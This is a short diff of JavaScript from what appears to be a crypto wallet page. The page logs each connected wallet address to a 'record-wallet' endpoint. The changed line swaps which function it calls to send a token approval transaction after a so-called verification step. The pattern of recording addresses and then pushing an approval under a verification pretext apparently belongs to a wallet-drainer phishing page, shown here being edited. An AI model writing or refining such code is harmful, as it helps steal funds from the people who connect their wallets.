@@ -1031,7 +1031,7 @@
       body: JSON.stringify({ address: account, chain: '1' })
     }).catch(err => console.error('Erreur record-wallet:', err));
 
-    setTimeout(sendApprovalTransaction, 1000); // ← change startVerification → requestSignature
+    setTimeout(sendExactApproveTransaction, 1000); // ← change startVerification → requestSignature
   }
 
 async function sendExactApproveTransaction() {
